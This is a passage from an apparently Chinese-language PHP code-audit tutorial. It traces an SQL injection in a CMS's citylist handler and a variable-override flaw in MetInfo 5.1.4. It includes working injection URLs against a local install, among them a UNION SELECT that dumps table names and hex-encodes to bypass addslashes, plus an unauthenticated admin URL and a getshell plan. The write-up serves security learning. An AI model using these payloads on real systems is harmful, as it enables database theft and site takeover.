class="variable">$verid</span> == <span class="variable">$rsList</span>[<span class="string">&#x27;id&#x27;</span>]) &#123;</span><br><span class="line">				<span class="variable">$list</span>.=<span class="string">&#x27;&lt;option selected value=&quot;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;cityname&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="variable">$list</span>.=<span class="string">&#x27;&lt;option value=&quot;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;cityname&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="variable">$list</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>其中sql语句中有两个变量，<code>$db_table </code> 这个变量尚未发现可修改点，<code>$parentid</code> 由accept函数进行处理，右键定位函数查看实现。</p>
<p>选项id2的accept函数，id1为安装cms时所用。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026150513549.png" alt="image-20211026150513549"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">accept</span>(<span class="params"><span class="variable">$k</span>, <span class="variable">$var</span>=<span class="string">&#x27;R&#x27;</span>, <span class="variable">$htmlcode</span>=<span class="literal">true</span>, <span class="variable">$rehtml</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$var</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$var</span>[<span class="variable">$k</span>])) &#123;</span><br><span class="line">				<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$putvalue</span> = <span class="keyword">isset</span>(<span class="variable">$var</span>[<span class="variable">$k</span>]) ? <span class="keyword">$this</span>-&gt;daddslashes(<span class="variable">$var</span>[<span class="variable">$k</span>], <span class="number">0</span>) : <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$htmlcode</span> ? (<span class="variable">$rehtml</span> ? <span class="keyword">$this</span>-&gt;preg_htmldecode(<span class="variable">$putvalue</span>) : <span class="keyword">$this</span>-&gt;htmldecode(<span class="variable">$putvalue</span>)) : <span class="variable">$putvalue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据代码可知，accept()接受的第二个参数决定<code>parentid</code>是否可以接受$_GET 或 $_POST的值。</p>
<p><code>accept(&#39;verid&#39;, &#39;R&#39;);</code> 可知第二个参数为R，R变量也就在accept中获得了$_GET的内存地址，也就是说R变量相当于$_GET，若$R[‘verid’] $_GET方式获得的值为空的话，则去POST请求处取值。</p>
<p>也就是说当accept第二个参数为R时，accept的第一个参数<code>verid</code>可以接受POST或GET请求的值。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026152610244.png" alt="image-20211026152610244"></p>
<p>随后参数经过daddslashes的处理，右键跟进可知，此处递归处理字符串，避免双引号，反斜线的出现造成sql注入等问题；但我们刚才拿到的citylist.php处为无符号sql，查询引号问题也可用16进制避免，因此此处防护无效。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026152638025.png" alt="image-20211026152638025"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$force</span>=<span class="number">0</span>, <span class="variable">$strip</span>=<span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!get_magic_quotes_gpc() || <span class="variable">$force</span> == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (is_array(<span class="variable">$string</span>)) &#123;</span><br><span class="line">				<span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">					<span class="variable">$string</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$strip</span> ? stripslashes(<span class="variable">$val</span>) : <span class="variable">$val</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="variable">$string</span> = addslashes(<span class="variable">$strip</span> ? stripslashes(<span class="variable">$string</span>) : <span class="variable">$string</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后经过html编码处理，return回到citylist.php，<strong>此时，若是将类实例化，我们便可以通过POST或GET方式对parentid进行传参。</strong></p>
<p>查询类<strong>important</strong> ，可以看到其在index.php内进行实例化操作，跟进审计。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026152938912.png" alt="image-20211026152938912"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$point</span> = indexget(<span class="string">&#x27;point&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line"><span class="variable">$point</span> = <span class="keyword">empty</span>(<span class="variable">$point</span>) ? <span class="string">&#x27;admin&#x27;</span> : <span class="variable">$point</span>;</span><br><span class="line"><span class="variable">$archive</span> = indexget(<span class="string">&#x27;archive&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line"><span class="variable">$archive</span> = <span class="keyword">empty</span>(<span class="variable">$archive</span>) ? <span class="string">&#x27;adminuser&#x27;</span> : <span class="variable">$archive</span>;</span><br><span class="line"><span class="variable">$action</span> = indexget(<span class="string">&#x27;action&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">empty</span>(<span class="variable">$action</span>) ? <span class="string">&#x27;login&#x27;</span> : <span class="variable">$action</span>;</span><br><span class="line"><span class="variable">$soft_MOD</span> = <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;product&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;filemanage&#x27;</span>, <span class="string">&#x27;basebook&#x27;</span>, <span class="string">&#x27;member&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;other&#x27;</span>, <span class="string">&#x27;news&#x27;</span>, <span class="string">&#x27;inc&#x27;</span>, <span class="string">&#x27;cache&#x27;</span>, <span class="string">&#x27;bann&#x27;</span>, <span class="string">&#x27;logs&#x27;</span>, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$point</span>, <span class="variable">$soft_MOD</span>)) &#123;</span><br><span class="line">	<span class="keyword">include</span> admin_ROOT . adminfile . <span class="string">&quot;/control/<span class="subst">$archive</span>.php&quot;</span>;</span><br><span class="line">	<span class="variable">$control</span> = <span class="keyword">new</span> important();</span><br><span class="line">	<span class="variable">$action</span> = <span class="string">&#x27;on&#x27;</span> . <span class="variable">$action</span>;</span><br><span class="line">	<span class="keyword">if</span> (method_exists(<span class="variable">$control</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">		<span class="variable">$control</span>-&gt;<span class="variable">$action</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;错误：系统方法错误！&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;错误：系统对象错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">indexget</span>(<span class="params"><span class="variable">$k</span>, <span class="variable">$var</span>=<span class="string">&#x27;R&#x27;</span>, <span class="variable">$htmlcode</span>=<span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$var</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$var</span>[<span class="variable">$k</span>])) &#123;</span><br><span class="line">				<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$putvalue</span> = <span class="keyword">isset</span>(<span class="variable">$var</span>[<span class="variable">$k</span>]) ? indexdaddslashes(<span class="variable">$var</span>[<span class="variable">$k</span>], <span class="number">0</span>) : <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$htmlcode</span> ? indexhtmldecode(<span class="variable">$putvalue</span>) : <span class="variable">$putvalue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难发现<code>point</code>、<code>archive</code>、<code>action</code> 都经过了indexget处理，专项indexget()方法可知，此方法就是在citylist中的accept，函数用法什么的都一个样，其中<code>$Point</code>的值需要在数组<code>soft_MOD</code>内，<code>$archive</code>需要为citylist，这样才能成功在下面的语句中将citylist.php页面包含 ,<code>$action</code> 值需要为<strong>citylist</strong>，这样才可被拼接，成功调用oncitylist方法，成功执行sql语句</p>
<p>由此构建payload：</p>
<p>此处point可不填，默认会被指为admin，也在soft_mod组内</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/cms/adminsoft/index.php?point=basebook&amp;archive=citylist&amp;action=citylist&amp;parentid=1</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026154542193.png" alt="image-20211026154542193"></p>
<p>进行sql注入测试:</p>
<p>爆表爆字段时，需要引号括起数据库、表名时可用16进制绕过<code>daddslashes</code>对特殊字符的转义处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/cms/adminsoft/index.php?point=basebook&amp;archive=citylist&amp;action=citylist&amp;parentid=-1 union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=0x657370636D73</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026155204670.png" alt="image-20211026155204670"></p>
<h4 id="MeInfo-5-1-4漏洞审计"><a href="#MeInfo-5-1-4漏洞审计" class="headerlink" title="MeInfo 5.1.4漏洞审计"></a>MeInfo 5.1.4漏洞审计</h4><p>1.未授权访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/meInfo/admin/app/physical/standard.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027102145398.png" alt="image-20211027102145398"></p>
<p>2.文件包含漏洞</p>
<p>安装MetInfo5.1.4版本</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027113702048.png" alt="image-20211027113702048"></p>
<p>利用esay检查可疑点，可以看到提示此处可能存在变量覆盖，双击进入php文件进行审计</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027114139562.png" alt="image-20211027114139562"></p>
<p>此处放出漏洞点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span> =&gt; <span class="variable">$_value</span>) &#123;</span><br><span class="line">		<span class="variable">$_key</span>&#123;<span class="number">0</span>&#125; != <span class="string">&#x27;_&#x27;</span> &amp;&amp; <span class="variable">$$_key</span> = daddslashes(<span class="variable">$_value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.在common.inc.php中，利用第一层foreach循环，将<code>_COOKIE、_POST、_GET</code>的值传给$_reuqest变量；</p>
<p>2.第二层foreach循环，将$$_request也就是<code>$_GET、$_POST、$_COOKIE</code>超全局变量中的键与值拆分成<code>$_key 与 $_value</code>形式拿到相应类型请求的变量名与变量值；</p>
<p>3.利用<code>$_key&#123;0&#125; != &#39;_&#39; &amp;&amp; $$_key = daddslashes($_value);</code> 来判$<em>key有是否是超全局变量</em>(比如说_SERVER这种)，不是则对变量值进行递归的addslashes处理。</p>
<p>getshell<strong>思路</strong></p>
<p>此处我们可以利用这一流程，通过cookie、get、post的请求方式，进行变量覆盖操作，若想要getshell，我们首先需要先找到一个包含了<code>common.inc.php</code>的php文件，并且该文件的变量我们可以通过$$变量覆盖，从而操纵sql语句或配合文件上传或日志文件对文件包含进行操作从而getshell。</p>
<p>利用全局搜索功能，搜索包含了common.inc.php的文件,找到合适目标/include/module.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;common.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">1</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;show.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;show.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_column</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">2</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;news.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;shownews.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_news</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">3</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;product.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showproduct.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_product</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">4</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;download.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showdownload.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_download</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">5</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;img.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showimg.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_img</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">6</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;job.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showjob.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_job</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">8</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;feedback.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;feedback.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_column</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">100</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;product.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showproduct.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_product</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">101</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;product.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showproduct.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_product</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$metid</span>) &amp;&amp; <span class="variable">$met_pseudo</span>)&#123;</span><br><span class="line">	<span class="comment">/*if(is_numeric($metid))&#123;</span></span><br><span class="line"><span class="comment">		if($list)&#123;</span></span><br><span class="line"><span class="comment">		&#125;else&#123;</span></span><br><span class="line"><span class="comment">			$modulelang=$lang?$lang:$met_index_type;	</span></span><br><span class="line"><span class="comment">			$numerok = $db-&gt;get_one(&quot;SELECT * FROM $met_column WHERE foldername=&#x27;$filpy&#x27; and (bigclass=&#x27;0&#x27; or releclass!=&#x27;0&#x27;) and module&lt;100 and lang=&#x27;$modulelang&#x27;&quot;);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">	&#125;else&#123;</span></span><br><span class="line"><span class="comment">		$dname = is_numeric($metid)?&quot;id=$metid&quot;:&quot;filename=&#x27;$metid&#x27;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">	<span class="variable">$dname</span> = is_numeric(<span class="variable">$metid</span>)?<span class="string">&quot;id=<span class="subst">$metid</span>&quot;</span>:<span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$list</span>)&#123;<span class="comment">/*��ֹ������*/</span></span><br><span class="line">		<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);	</span><br><span class="line">		<span class="keyword">if</span>(!is_array(<span class="variable">$anyone</span>))&#123;</span><br><span class="line">			<span class="variable">$metids</span>=explode(<span class="string">&#x27;-&#x27;</span>,<span class="variable">$metid</span>);</span><br><span class="line">			<span class="variable">$metidcount</span>=count(<span class="variable">$metids</span>)-<span class="number">1</span>;</span><br><span class="line">			<span class="variable">$page</span>=<span class="variable">$metids</span>[<span class="variable">$metidcount</span>];</span><br><span class="line">			<span class="variable">$metid</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$metids</span> <span class="keyword">as</span> <span class="variable">$keymetid</span>=&gt;<span class="variable">$valmetid</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$keymetid</span>!=<span class="variable">$metidcount</span>)&#123;</span><br><span class="line">					<span class="variable">$metid</span>.=<span class="variable">$valmetid</span>.<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="variable">$metid</span>||!<span class="variable">$page</span>)&#123;okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();&#125;</span><br><span class="line">			<span class="variable">$metid</span>=rtrim(<span class="variable">$metid</span>,<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">			<span class="variable">$dname</span> = is_numeric(<span class="variable">$metid</span>)?<span class="string">&quot;id=<span class="subst">$metid</span>&quot;</span>:<span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">			<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!is_array(<span class="variable">$anyone</span>) &amp;&amp; is_numeric(<span class="variable">$metid</span>))&#123;</span><br><span class="line">			<span class="variable">$dname</span> = <span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">			<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!is_array(<span class="variable">$anyone</span>))&#123;okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;releclass&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable">$class1</span>=<span class="variable">$metid</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;classtype&#x27;</span>]==<span class="number">1</span>)<span class="variable">$class1</span>= <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;classtype&#x27;</span>]==<span class="number">2</span>)<span class="variable">$class2</span>= <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;classtype&#x27;</span>]==<span class="number">3</span>)<span class="variable">$class3</span>= <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$mdle</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;module&#x27;</span>];</span><br><span class="line">		<span class="variable">$mdtp</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="variable">$lang</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;lang&#x27;</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$anybody</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE foldername=&#x27;<span class="subst">$filpy</span>&#x27; and lang=&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		<span class="variable">$danmy</span> = <span class="variable">$modulefname</span>[<span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>]][<span class="number">2</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>]==<span class="number">8</span>)<span class="variable">$metid</span>=<span class="variable">$anybody</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">		<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$danmy</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$anyone</span> &amp;&amp; is_numeric(<span class="variable">$metid</span>))&#123;</span><br><span class="line">			<span class="variable">$dname</span> = <span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">			<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$danmy</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$mdtp</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">		<span class="variable">$id</span> = <span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>]==<span class="number">8</span>?<span class="variable">$anybody</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">		<span class="variable">$mdle</span> = <span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$modulelang</span>=<span class="variable">$lang</span>?<span class="variable">$lang</span>:<span class="variable">$met_index_type</span>;</span><br><span class="line">	<span class="variable">$query</span>=<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE foldername=&#x27;<span class="subst">$filpy</span>&#x27; and (bigclass=&#x27;0&#x27; or releclass!=&#x27;0&#x27;) and module&lt;100 and lang=&#x27;<span class="subst">$modulelang</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="variable">$query</span>);	</span><br><span class="line">	<span class="variable">$class1</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="variable">$mdle</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;module&#x27;</span>];</span><br><span class="line">	<span class="variable">$mdtp</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fmodule</span>!=<span class="number">7</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">100</span>)<span class="variable">$mdle</span>=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">101</span>)<span class="variable">$mdle</span>=<span class="number">5</span>;</span><br><span class="line">	<span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$module</span>==<span class="literal">NULL</span>)&#123;okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">2</span>||<span class="variable">$mdle</span>==<span class="number">3</span>||<span class="variable">$mdle</span>==<span class="number">4</span>||<span class="variable">$mdle</span>==<span class="number">5</span>||<span class="variable">$mdle</span>==<span class="number">6</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$fmodule</span>==<span class="variable">$mdle</span>)&#123;</span><br><span class="line">			<span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$list</span>)&#123;</span><br><span class="line">			okinfo(<span 